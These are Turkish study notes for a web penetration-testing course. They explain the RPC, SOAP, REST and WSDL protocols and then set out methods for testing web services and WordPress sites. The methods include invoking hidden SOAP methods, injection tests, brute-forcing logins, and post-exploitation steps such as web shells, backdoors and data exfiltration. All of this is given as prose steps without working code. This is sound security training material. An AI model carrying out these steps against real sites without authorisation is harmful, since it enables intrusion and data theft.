**JSON-RPC** ve **XML-RPC**, **uzaktan prosedür çağrıları (Remote Procedure Calls – RPC)** yapmak için sırasıyla **JSON** ve **XML** formatlarını kullanan **hafif protokollerdir.**  
Bu yöntemler, SOAP’a göre daha **basit ve hızlı alternatifler** olarak kabul edilir.  
Uygulamalar arasında temel fonksiyon çağrıları ve veri aktarımı için idealdir. Ancak güvenlik önlemlerinden yoksun olabilir ve kullanımı günümüzde neredeyse yoktur.

==**RPC**, Türkçesiyle **“Uzaktan Prosedür Çağrısı”**, bir bilgisayar programının **başka bir bilgisayarda çalışan bir fonksiyonu (veya prosedürü)** **sanki kendi içinde çalışıyormuş gibi çağırabilmesini** sağlayan bir yöntemdir.==

*3. REST (Representational State Transfer):*
**REST**,  **web servisleri geliştirmek için kullanılan bir mimari stildir.**  
==Yani REST, bir protokol değil (örneğin SOAP gibi), **servislerin nasıl tasarlanması gerektiğini tanımlayan kurallar bütünüdür.**==
**HTTP protokolünü** iletişim için kullanır ve genellikle **JSON veya XML** formatında veri taşır.  
RESTful servisler, **basit, hızlı, ölçeklenebilir** ve günümüzde **en yaygın kullanılan web servis türüdür.**

---

Tarihsel olarak ilk başa gidersek SOAP ve REST'e öncü olabilecek  başta XML-RPC'yi ve sonra JSON-RPC'yi  detaylarıyla inceleyebiliriz:

**XML-RPC (Extensible Markup Language - Remote Procedure Call):**  
1998 yılında geliştirilen **XML-RPC**, verilerin **XML formatında kodlanması ve çözülmesi (encode/decode)** için kurallar tanımlayan bir **protokol** ve **yöntemler kümesidir.**  
Bu protokol, **farklı sistemlerde çalışan yazılım uygulamaları arasında iletişim kurmayı** sağlayan **basit ve hafif bir yöntemdir.** Genellikle bu iletişim **internet gibi ağlar üzerinden** gerçekleşir.

**XML-RPC**, daha sonra geliştirilen **SOAP** ve **REST** gibi modern web servis protokollerinin **öncüsü** olmuştur.
Çalışma prensibi olarak, istemci **HTTP istekleri göndererek** uzak bir sistemde tanımlı **tek bir metodu çağırır.**  
Uzak sistem bu isteği işler ve sonucu XML formatında geri döner.

XML-RPC Request Example:

![[Pasted image 20251027203435.png]]

**JSON-RPC**, **JSON (JavaScript Object Notation)** formatında veri kullanan bir **uzak prosedür çağrısı (RPC) protokolüdür.**

**XML-RPC** gibi, **farklı makinelerde veya platformlarda çalışan yazılım bileşenleri arasında iletişimi** mümkün kılar.  
Basitliği, **insan tarafından kolay okunabilir olması** ve **az veri kullanması** sayesinde özellikle **web geliştirme** ve **mikroservis mimarilerinde** oldukça popüler hale gelmiştir.

**XML-RPC’ye benzer**, ancak **JSON kullanması nedeniyle daha hafif** ve **daha hızlı iletişim** sağlar.

Çalışma şekli şu şekildedir:  
İstemci, uzaktaki bir sunucuda bulunan belirli bir **metodu veya fonksiyonu çağırmak için** bir **JSON nesnesi (JSON Object)** gönderir.  
Bu nesne içinde çağrılacak metodun adı ve parametreleri yer alır.  
Sunucu isteği işler ve sonucu yine JSON formatında geri döner.

![[Pasted image 20251027205054.png]]
##### SOAP:

SOAP, web servislerinin uygulanmasında **yapılandırılmış bilgilerin (structured information) değişimi** için kullanılan bir **protokoldür.**
==Bu protokol, **mesajların nasıl yapılandırılacağı, uzak prosedür çağrılarının (RPC) nasıl yapılacağı ve yazılım bileşenleri arasında iletişimin nasıl yönetileceği** ile ilgili bir dizi kural ve standart belirler.== Genellikle iletişim **internet üzerinden**(https) gerçekleşir.

SOAP, **XML-RPC’nin doğal bir devamı** olarak görülür ve **güçlü veri tipleri (strong typing)** ile **gelişmiş özellikler** sunar. Bu özellikler arasında:
- **Güvenlik (security)**
- **Güvenilirlik (reliability)**
- **İşlem desteği (transaction support)**  
    bulunur.
==Ayrıca, SOAP web servisleri **WSDL (Web Services Description Language)** tanımı da sağlayabilir. Bu tanım, servis ile **nasıl kullanılacağını ve nasıl etkileşim kurulacağını** belirtir.== Ki bir pentester için bu çok kıymetli olabilir çünkü süreci anlamayı kolaylaştırır.

![[Pasted image 20251027210043.png]]

![[Pasted image 20251027210154.png]]
Görüldüğü gibi iletişim (SOAP'da) HTTP(s) üzerinden kurulur.
##### REST(RESTful APIs):

REST, ağ tabanlı uygulamaların tasarımı için kullanılan bir **mimari stildir**.  
Kendisi bir protokol veya teknoloji değil, web servisleri ve API’lerin (**Application Programming Interfaces**) ==tasarımını yönlendiren **ilkeler ve sınırlamalardan oluşan bir rehberdir.**==

REST, **ölçeklenebilir, durumsuz (stateless) ve bakımı kolay** web servisleri ve API’ler geliştirmek için yaygın olarak kullanılır. Bu servisler internet üzerinden erişilebilir.
REST web servisleri genellikle **JSON** veya **XML** formatında veri taşır; ancak **düz metin (plain-text)** gibi başka veri formatları da kullanılabilir

![[Pasted image 20251027210751.png]]..
.


## WSDL Language Fundemaentals: 

Öncelikle bir web servisi *metod* ve *protocol* olarak karkaterize edilebilir.

*1) Bir veya Daha Fazla Metot)*
- Her **metot**, **sunucunun sağladığı bir hizmeti** temsil eder.
- Yani web servisin dışa sunduğu **fonksiyonlar/metotlar**, istemcinin çağırabileceği işlemlerdir.

Örneğin:
- `getUser()` → Kullanıcı bilgisi getirir
- `addProduct()` → Ürün ekler
- `calculateTotal()` → Toplam hesaplar

Web servisin **hangi işlemleri yapabildiğini** tanımlar.
==**Kısacası:** _Metot = Sunucunun sağladığı hizmet veya işlem._==

*2)  Protokol:*
Protokol, web servis ile istemci arasında **mesajların nasıl taşınacağını ve yapılandırılacağını** belirler
Görsele göre protokol şunları tanımlar:

| Protokolün Tanımladığı Şey | Açıklama                                                     |
| -------------------------- | ------------------------------------------------------------ |
| **İstek mesajının yapısı** | İstemci hizmeti çağırırken mesaj nasıl formatlanmalı?        |
| **Yanıt mesajının yapısı** | Sunucu cevabı hangi formatta gönderecek?                     |
| **İleti taşıma yöntemi**   | Mesajlar hangi kanal ile taşınacak? (HTTP, HTTPS, SMTP, vb.) |
Örnek protokoller:
- **HTTP/HTTPS**
- **SOAP**
- **gRPC**
- **WebSockets**

İstemci ve sunucun **konuşma dilini** ve **veri aktarım kurallarını belirlemek**.
==**Kısacası:** _Protokol = Hizmetin “nasıl iletişim kuracağını” belirleyen kurallar bütünü._==

*WSDL (Web Services Description Language):*

WSDL, bir web servisinin **hangi işlemleri gerçekleştirebildiğini**, **nasıl çağrılacağını** ve **hangi veri formatlarını kabul ettiğini** tanımlamak için kullanılan **XML tabanlı bir dildir.**

WSDL belgeleri, **servis sağlayıcı (provider)** ile **servisi kullanmak isteyen uygulama (consumer)** arasında bir **“sözleşme” (contract)** görevi görür.  
==Bu sayede, servise erişmek isteyen taraflar **ne göndermeleri gerektiğini ve ne beklemeleri gerektiğini** net bir şekilde bilirler.==
==WSDL genellikle **SOAP tabanlı web servisleri** ile birlikte kullanılır ve bu servislerin yapısını, yöntemlerini ve veri tiplerini detaylı şekilde tarif eder.==

WSDL’in (Web Services Description Language) günümüzde iki temel sürümü vardır: **1.1** ve **2.0**.  
Her ne kadar **WSDL 2.0** güncel sürüm olsa da, **birçok web servisi hâlâ WSDL 1.1 kullanmaktadır.**

Bu nedenle, sonraki slaytlarda **her iki WSDL sürümünü de** ele alacağız ve karşılaştırmalı olarak inceleyeceğiz.
Öncelikle bilmemiz gereken önemli bir nokta şudur: **WSDL belgeleri iki farklı tanım içerir: “Soyut (Abstract)” ve “Somut (Concrete)” tanımlar.**

*Abstract (Soyut Tanım)*
Bu bölüm, **servisin ne yaptığını** açıklar.  
Yani:
- Hangi **işlemleri (operations)** sunduğunu,
- Bu işlemlerde kullanılan **girdi (input)** ve **çıktı (output)** mesajlarını,
- Olası **hata (fault)** mesajlarını  tanımlar.
Burada yalnızca **mantıksal işlevsellik** anlatılır.  
**Nasıl** ve **nerede** çalıştığı henüz belirtilmez.

*Concrete (Somut Tanım)*
Bu bölüm ise servisin **nasıl ve nerede erişilebileceğini** belirtir.  
Yani:
- Hangi **iletişim protokolü** kullanıldığı (örneğin SOAP/HTTP),
- Hangi **adres (URL)** üzerinden erişildiği,
- Mesajların **formatı** ve **kapsayıcı bilgiler**  
    bu kısımda tanımlanır.

 Burada, **teknik bağlantı ve iletişim ayrıntıları** açıklanır.
Aşağıdaki görtsel WSDL 1.1 ile 2.0 arasındaki temel farkları gösterir:

![[Pasted image 20251029145316.png]]

Bir WSDL (Web Services Description Language) belgesi genellikle **SOAP tabanlı bir web servisini tanımlamak** için oluşturulur.  
Bu belge, servisin sunduğu **işlemleri (operations)**, bu işlemler için **girdi (input)** ve **çıktı (output)** mesajlarının yapısını ve bu işlemlerin **SOAP protokolü ile nasıl ilişkilendirildiğini (binding)** belirtir.

Bir WSDL belgesi, servis tarafından sunulan **API’nin teknik dokümantasyonu** niteliğindedir.

Aynı zamanda WSDL, **servis sağlayıcı (provider)** ile **servisi kullanacak uygulamalar (consumers)** arasında bir **sözleşme (contract)** görevi görür.  
Bu sözleşme, istemcilerin **servise nasıl SOAP isteği göndermesi gerektiğini** açıkça tanımlar.  
Yani:
- Hangi işlemler çağrılabilir,
- Bu işlemler hangi parametreleri alır,
- Hangi cevapları döner,  
hepsi WSDL içinde net biçimde belirtilmiştir.

![[Pasted image 20251029145825.png]]

Bir WSDL belgesi, web servisinin nasıl çalıştığını tanımlayan birden fazla bölüme sahiptir. Bunlardan bazıları şunlardır:

 **1) `<types>` Bölümü**
- Bu bölüm, web servisinde kullanılacak **veri tiplerini** tanımlar    
- Genellikle **XML Şema Tanımları (XSD)** içerir.
- Girdi (input) ve çıktı (output) mesajlarının **hangi veri biçiminde ve yapıda** olması gerektiğini belirtir.
> Yani: **Veri modellerinin tanımlandığı** kısımdır.

**2) `<message>` Bölümü**
- Bu bölüm, **istemci ile servis arasında gönderilen mesajların yapısını** tanımlar.
- Her mesaj, bir veya daha fazla **part (parça)** içerebilir.
- Her **part**, bir **isim** ve bir **tür (type)** referansı içerir.
- Bu türler, genellikle **`<types>` bölümünde tanımlanan veri tiplerine** dayanır.
> Yani: **Gönderilen veri paketlerinin yapısı burada açıklanır.**

**3) `<portType>` Bölümü**
- Bu bölüm, web servisinin sunduğu **operasyonları (functions / methods)** tanımlar.
- Her bir operasyon, bir istemcinin çağırabileceği bir **fonksiyona** karşılık gelir.
- Operasyonların **hangi mesajı girdi olarak aldığı** ve **hangi mesajı çıktı olarak döndürdüğü** burada belirtilir.
> Yani: **Servisin yapabileceklerinin listesini ve bu işlemlerin giriş-çıkışlarını gösteren kısımdır.**

**4) `<binding>` Bölümü
- Bu bölüm, servis işlemlerinin **hangi protokol** üzerinden çalışacağını belirtir.  
    Örneğin: **SOAP over HTTP**, SOAP 1.1, SOAP 1.2 vb.
- Mesajların **nasıl kodlanacağını (encoding)** ve iletişim kurmak için kullanılacak **iletişim kuralları** bu bölümde tanımlanır.
- Yani `<portType>` bölümünde tanımlanan işlemler burada **gerçek bir iletişim protokolüne bağlanır (bound)**.
> **Kısaca:** `"<portType>"`daki fonksiyonlar **hangi protokolle** çalışacak?" sorusunun cevabı bu bölümdedir.

 **5)  `<service>` Bölümü
- Bu bölüm, **servisin kendisi hakkında temel bilgileri** içerir.
- ==Servisin **adı** ve **erişim adresi (endpoint URL)** burada belirtilir.==  
    Bu adres, istemcilerin servise bağlanmak için kullanacağı **gerçek URL**’dir.
> **Kısaca:** "Bu servise **nereden bağlanırım?**" sorusunun cevabı bu bölümdedir.

---

**`<binding>`** elementi, web servisindeki işlemlerin **hangi protokol** üzerinden çalışacağını tanımlar.  
Örneğin servis, **SOAP over HTTP** kullanacaksa bu bilgi bu bölümde belirtilir.
Bu bölüm ayrıca:
- Kullanılacak **iletişim protokolünü**,
- Mesajların **nasıl kodlanacağını (message encoding)**,
- Ve servisin erişim **uç noktası (endpoint) adresi** gibi detayları da içerir.
Yani kısaca, `<binding>` bölümü **servisin iletişim şeklini ve kurallarını** tanımlar.
![[Pasted image 20251029151021.png]]

**`<portType>`** elementi, web servisinin **hangi işlemleri (operations)** desteklediğini tanımlar.  
Her bir işlem, istemcinin çağırabileceği bir **metot veya fonksiyona** karşılık gelir.
Bu bölüm, her işlem için:
- **Girdi (input)** mesajını
- **Çıktı (output)** mesajını  
    belirterek işlemin nasıl kullanılacağını açıklar.
![[Pasted image 20251029151220.png]]

WSDL 2.0 sürümünde, eski **`<portType>`** yerine **`<interface>`** elementleri kullanılmaktadır.
- **`<interface>`**, istemci ile servis arasındaki etkileşimi temsil eden **bir dizi operasyonu** tanımlar.
- Her operasyon, servisin **gönderebileceği veya alabileceği mesaj tiplerini** belirtir.

Eski `<portType>`’tan farklı olarak.
- `<interface>` elementleri artık **doğrudan mesajlara (`<message>`) işaret etmez**.
- Bunun yerine, `<types>` bölümünde tanımlı **şema (schema) elementlerine** referans verir.

## Web Service Security Testing:

Web servis güvenlik testi, bir web servisinin güvenliğini değerlendirerek,  
**gizlilik (confidentiality)**, **bütünlük (integrity)** ve **erişilebilirliği (availability)** tehdit edebilecek   **zafiyetleri, zayıf noktaları ve potansiyel saldırı risklerini** belirleme sürecidir.

Web servisleri genellikle internet üzerinden erişilebilir olduğundan,  **saldırılara açık hedeflerdir.**  
Bu nedenle güvenlik testleri, hem servis üzerinde işlenen **verilerin korunması**,  hem de servisin **güvenilir ve kesintisiz çalışması** için kritik öneme sahiptir

==*TEST METADOLİJİSİ:*==

*1) Bilgi Toplama ve Analiz*
- Test edilecek **SOAP web servislerini** belirle.
- Servise ait **WSDL dosyasını** tespit et.
- Servisin:
    - **Uç noktalarını (endpoints)**
    - **Sunduğu operasyonları**
    - **Değiştirilen / taşınan veri türlerini**  
        öğren ve analiz et.
- Servisin kullandığı **güvenlik gereksinimlerini**, **kimlik doğrulama (authentication)** ve **yetkilendirme (authorization)** mekanizmalarını anlamaya çalış.

*2) Tehdit Modellemesi*
- SOAP web servislerine özgü olası güvenlik tehditlerini ve zafiyetlerini belirle.
- Aşağıdaki saldırı risklerini göz önünde bulundur:
    - **Yetkisiz erişim**
    - **Veri enjeksiyonu**
    - **XML tabanlı saldırılar** (ör. **XXE – XML External Entity Injection**) 
    - Mesaj manipülasyonu ve tekrar saldırıları (Replay attacks)
    - Hatalı oturum ve kimlik doğrulama yönetimi      ve daha fazlası.

*3) Kimlik Doğrulama ve Yetkilendirme Testi*
- Serviste kullanılan **kimlik doğrulama yöntemlerini** (örn. kullanıcı adı/şifre, token, API key) test et ve **yetkisiz erişimi engelleyip engellemediğini** kontrol et.
- Sisteme giriş yapan kullanıcıların:
    - **Gerçekten doğrulandığını (authentication)**
    - Yalnızca **izin verilen işlemlere ve kaynaklara eriştiğini (authorization)**  doğrula.
- Bu aşamada:
    - Yetkisi olmayan bir kullanıcı **yetkili işlemleri yapabiliyor mu?**
    - Yetkili kullanıcı sınırlarının dışına çıkabiliyor mu?  
        gibi durumlar test edilir.

*4) Girdi Doğrulama (Input Validation) Testi*
- Servisin giriş parametrelerinde **doğru şekilde veri kontrolü yapılıp yapılmadığını** test et.
- Şu tür zafiyetleri araştır:
    - **SQL Injection**
    - **XSS (Cross-Site Scripting)**
    - **XML tabanlı saldırılar** (ör. XXE – XML External Entity)
- Web servisine **kötü niyetli veri göndererek**, sistemin nasıl davrandığını incele.  
  Amaç, güvenlik kontrollerinin **yanlış, eksik veya hiç yapılmadığı** yerleri bulmaktır.
---
Bu bölüm eWPT kapsamında olup ileri aşama testleri eWPTX kapsamında inceleyeceğiz. Ancak öncesinde temel bir giriş maksadıyla örnek olarak SOAP üzerinde test yapacağız ve bu süreçte de aşağıdaki metadolijiyi benimseyeceğiz:

- Identify SOAP web service and endpoints
- Perform WSDL Enumeration
- Invoke hidden methods
- Bypass SOAP body restrictions
- Test for input validation vulnerabilities.

==Hassas işlevlere erişimi kısıtlamak ve  güvenliği artırmak için  SOAP web servisi WSDL belgesinde bazı metotları gizleyebilir.==

*WSDL Disclosure & Method Enumeration* Web servisi güvenliğiyle uğraşırken **WSDL dosyasına erişmek ilk adımdır**; bu dosya, sunucunun izin verdiği tüm operasyonlar ve veri tiplerinin tam listesini, doğru kullanım için gereken sözdizimini, giriş/çıkış bilgilerini ve başarılı güvenlik testleri sırasında (veya kötü amaçlı kullanım senaryolarında) ihtiyaç duyulabilecek diğer tüm faydalı bilgileri içerir.  
WSDL dosyasını keşfetmeden (enumerate etmeden) önce ise **öncelikle hedef SOAP web servisinin kendisini ve ilgili uç noktalarını (endpoints) tespit etmemiz gerekir.**
WSDL dosyalarını bulduktan sonra bunları incelemeye başlayıp web servisi hakkında değerli bilgiler toplayabiliriz.  
Bildiğimiz gibi bu, servis **operasyonları**, **veri yapıları**, **sözdizimi** ve daha pek çok faydalı bilginin elde edilmesini sağlar.

*Invoke hidden methods*
SOAP tabanlı web servislerde **WSDL dosyası her zaman tüm mevcut fonksiyonları (methodları) göstermez.** Bazı methodlar **bilinçli olarak gizlenmiş** veya **dokümante edilmemiş** olabilir.  
**"Invoke hidden methods"**, bu gizli/dokümansız methodları **keşfedip çağırma (invoke etme)** işlemine verilen addır.

==Gizli methodlar da **sunucuda aktiftir** → Çağrılabiliyorsa istismar edilebilir.==

*NOT:*
**SOAPAction**, HTTP üzerinden gönderilen SOAP isteklerinde hangi SOAP operasyona (veya işleme) yönelik çağrı yapıldığını belirtmek için kullanılan bir **HTTP başlığıdır.(header)
- HTTP isteği geldiğinde sunucuya **istemcinin hangi SOAP işlemini** çağırmak istediğini bildirir.

`POST /MyService HTTP/1.1`
`Host: example.com`
`Content-Type: text/xml; charset=utf-8`
`Content-Length: 456`
`SOAPAction: "http://example.com/MyService/DoThing"`

`[SOAP Envelope XML burada]`

*Bypass SOAP body restrictions*, SOAP isteğinin (HTTP body içindeki XML’in) sunucu tarafından uygulanan kısıtlamalarından —ör. zorunlu alan doğrulamaları, şema (XSD) kontrolleri, boyut/şablon sınırlamaları veya beklenen XML yapısı— kaçınmak/atlatmak için yapılan test veya saldırı denemeleridir.

Aşağıdaki örnekte görüldüğü üzere web servis isteğinde password alanına `'`  girilmesi veri tabanında hataya neden oluyor. (Error-based)

![[Pasted image 20251102024203.png]]
Aşağıdaki sorgu çalıştırılarak kullanıcı silme işlemi başarılmıştır.

![[Pasted image 20251102025021.png]]

Aşağıda bir başka örnek olarak Command Injection'a yer verilmiştir:

![[Ekran görüntüsü 2025-11-02 025952.png]]

---

# CMS Pentesting:

*Kurs Başlıkları:*

- Introduction To Content Management Systems(CMS)
- Introduction To CMS Security Testing
- CMS Security Testing Methodology
- WordPress Security Testing Methodology
- WordPress Information Gathering & Enumeration
- WordPress Vulnerability Scanning
- WordPress Authentication Attacks
- WordPress Plugin Exploitation
- WordPress Black-Box Penetration Testing
## Security Testing Introduction CMS: 

**İçerik Yönetim Sistemleri (CMS)**, web uygulaması güvenlik testlerinde kritik bir rol oynar çünkü yaygın olarak kullanıldıkları için saldırganlar tarafından sıkça hedef alınırlar.  
Güvenlik testleri bağlamında CMS’leri anlamak, zafiyetlerin etkili şekilde tespit edilmesi ve giderilmesi açısından önemlidir.

**İçerik Yönetim Sistemi (CMS)**, kullanıcıların web üzerinde dijital içerik oluşturmasına, yönetmesine ve yayınlamasına olanak tanıyan bir yazılım uygulaması veya platformdur.  
CMS’ler, içerik oluşturma, düzenleme ve organize etme işlemleri için kullanıcı dostu bir arayüz sunarak web sitelerinin kurulmasını ve yönetilmesini kolaylaştırır.

CMS’ler web uygulamaları ve web sitelerinin ayrılmaz bir parçasıdır. Bu nedenle, güvenlik testlerinde öncelikli hedef olmalarının birkaç sebebi vardır:

- **Yaygınlık:** WordPress, Drupal ve Joomla gibi CMS’ler, internet üzerindeki web sitelerinin büyük bir bölümünü destekler. Bu kadar yaygın kullanılmaları, saldırganlar için çekici hedefler haline getirir.
- **Karmaşıklık:** CMS’ler çok sayıda özellik sunar; eklentiler, temalar ve çeşitli özelleştirme seçenekleri bulunur. Bu geniş yapı, potansiyel güvenlik açıklarının ortaya çıkmasına neden olabilir.
- **Düzenli Güncellemeler:** CMS platformları güvenlik açıklarını gidermek amacıyla sıkça güncelleme ve yamalar yayınlar. Güvenlik testi, bu güncellemelerin doğru şekilde uygulandığından emin olmak için gereklidir.
- **Kullanıcı Verisi:** CMS’ler çoğu zaman hassas kullanıcı verilerini işler veya depolar. Bu nedenle veri ihlallerine karşı güçlü bir güvenlik sağlamak çok önemlidir.

*Yaygın Zaafiyetler:*

- **Zafiyetler:** CMS’lerde SQL Injection, Cross-Site Scripting (XSS), Cross-Site Request Forgery (CSRF) gibi çeşitli güvenlik açıkları bulunabilir. Bu zafiyetlerin tespit edilip giderilmesi gerekir.
- **Kimlik Doğrulama ve Yetkilendirme:** Güvenlik testleri, kullanıcı kimlik doğrulama ve yetkilendirme mekanizmalarının güçlü olduğunu ve kullanıcı rollerinin/izinlerinin doğru şekilde uygulandığını doğrulamalıdır.
- **Yapılandırma Sorunları:** Yanlış yapılandırmalar, varsayılan (default) hesap bilgileri veya aşırı izinli ayarlar güvenlik açıklarına yol açabilir.
- **Eklenti ve Tema Güvenliği:** CMS’lerde eklenti ve tema yükleme imkânı bulunmaktadır. Ancak güvenli şekilde geliştirilip güncellenmeyen eklenti ve temalar sisteme zafiyet kazandırabilir.

*Metadoloji:*

**Bilgi Toplama & Keşif**
- CMS ve CMS sürümünü tespit et.
- Kullanıcıları, eklentileri ve temaları tespit et.
- Dizin ve dosya keşfi (directory/file enumeration) gerçekleştir.

**Zafiyet Taraması*
- Yaygın yanlış yapılandırma ve zafiyetleri test et.
- Eklenti ve temalardaki potansiyel zafiyetleri/yanlış yapılandırmaları belirlemek için zafiyet taraması/analizi yap.

 **Kimlik Doğrulama Testleri**
- Giriş sayfalarında kullanıcı adı keşfi (username enumeration) ve kaba kuvvet (brute-force) testleri gerçekleştir.
- Oturum (session) yönetimini değerlendir; zayıflıkları ve potansiyel oturum sabitleme (session fixation) zafiyetlerini tespit et.

**Sömürme (Exploitation)**
- CMS çekirdeğindeki bilinen zafiyetleri tespit et ve istismar et.
- Eklentiler/uzantılar ve temalardaki zafiyetleri tespit et ve istismar et

**Sonrası Sömürme (Post-Exploitation)**
- Sömürme sonrası CMS üzerinde arka kapı (backdoor) veya web shell şeklinde erişimi sürdürmenin yollarını tespit et.
- CMS’den veya altındaki sunucudan veri çıkarmayı (veri eksfiltrasyonu) dene.

*WORDPRESS Nedir?*

WordPress, web siteleri ve web uygulamaları oluşturmak için kullanılan en popüler ve en yaygın İçerik Yönetim Sistemlerinden (CMS) biridir.  
WordPress **açık kaynaklı** bir CMS’dir; yani kaynak kodu topluluk tarafından incelenebilir ve geliştirilebilir.  
Ayrıca WordPress **modüler bir yapıya sahiptir** ve kullanıcıların eklentiler ve temalar aracılığıyla işlevselliğini genişletmesine olanak tanır.  
İçerik yönetimi için sunduğu **kullanıcı dostu arayüz**, teknik bilgisi sınırlı kişiler tarafından bile kolayca kullanılmasını mümkün kılar.  
Web uygulaması güvenlik testleri bağlamında WordPress’i anlamak oldukça önemlidir, çünkü saldırganlar tarafından sıkça hedef alınan bir platformdur.

*Bilgi Toplama & Keşif*
- Port taraması ve servis keşfi yap. (Web sunucusu, veritabanı vb. servisleri tespit et.)
- Çalışan WordPress sürümünü tespit et.
- WordPress sitesinde yüklü tema ve eklentilerin listesini ve bunların sürümlerini tespit et.
- Gizli veya hassas kaynakları belirlemek için dosya ve dizin keşfi (file & directory enumeration) gerçekleştir.

*Zafiyet Taraması*
- Yaygın WordPress yanlış yapılandırmalarını ve zafiyetlerini tespit et.
- WPScan gibi otomatik araçlarla eklenti ve temalardaki zafiyetleri belirlemek için otomatik zafiyet taraması yap.

*Kimlik Doğrulama Testleri*
- /wp-admin veya /wp-login.php üzerinde geçerli kimlik bilgisi elde etmek için kaba kuvvet (brute-force) saldırıları gerçekleştir.
- WordPress’te oturum yönetimi (session management) zafiyetlerini test et.

 *Sömürme (Exploitation)*
- WordPress temaları ve eklentilerindeki bilinen açıklıkları (ör. XSS, SQLi vb.) tespit et ve istismar et.

*Sonrası Sömürme (Post-Exploitation)*
- Web shell'ler veya arka kapılar (backdoor) aracılığıyla WordPress sitesi / web sunucusu üzerinde kalıcılık (persistence) sağla.
- WordPress sitesinden veya altındaki sunucudan hassas verileri sızdır (veri eksfiltrasyonu)


## Information Gathering & Enumeration

 ==*Bilgi Toplama & Keşif*==
- Port taraması ve servis keşfi yap.(Web sunucusu, veritabanı vb. servisleri tespit et.)
- Çalışan WordPress sürümünü tespit et.
- WordPress sitesinde yüklü tema ve eklentilerin listesini ve bunların sürüm bilgilerini tespit et.
- Gizli veya hassas kaynakları belirlemek için dosya ve dizin keşfi (file & directory enumeration) gerçekleştir.

 *Manuel Kontroller*
- WordPress Meta Generator etiketini kontrol et.
- WordPress `readme.html` veya `license.txt` dosyasını kontrol et.
- HTTP yanıt başlıklarını (ör. `X-Powered-By`) inceleyerek sürüm bilgisi ara.
- Giriş (login) sayfasını kontrol et; çoğu zaman WordPress sürümü burada gösterilir.
- WordPress REST API’sini kontrol et ve JSON yanıtındaki `version` alanına bak.
    - Örnek: `http://example.com/wp-json/`
- JavaScript (JS) ve CSS dosyalarını sürüm bilgisi için analiz et.
- WordPress değişiklik günlüklerini (changelog) incele; sürüm güncellemeleri hakkında bilgi içerebilir.
    - WordPress dizininde `changelog.txt` veya `readme.txt` gibi dosyalar arayın.

 *Otomatik (Automated)*
- **WPScan, CMSmap ve benzeri araçlar**, WordPress sürüm tespiti ve zafiyet değerlendirmesi için özel olarak tasarlanmıştır.
- **Bu araçlar süreci otomatikleştirir** ve sitenin yapılandırması hakkında ek bilgiler sağlar.

![[Ekran görüntüsü 2025-11-06 130306.png]]

Aşağıda curl kullanılarak bir enumerate yapılmıştır. Bu yöntemde css ve js yapılarının  versiyon referanslerı üzerinden keşif yapılmıştır ancak eski sürümler de  burada gözükebilir:

![[Pasted image 20251106130859.png]]
/readme.html 

![[Pasted image 20251106131151.png]]

Örnek lab çözümü için [tıklayınız](https://assets.ine.com/labs/ad-manuals/walkthrough-446.pdf?_gl=1*1a2bzhz*_gcl_au*ODQ2ODM0MTA1LjE3NjIzNjYyNDY.*_ga*NjgwNDczNDk0LjE3NTQ1Nzk4Mjc.*_ga_EQZTB17YGQ*czE3NjI0MjM5MzYkbzEwOSRnMSR0MTc2MjQyNDIyNyRqNDUkbDAkaDI0OTc0ODI0Mw..).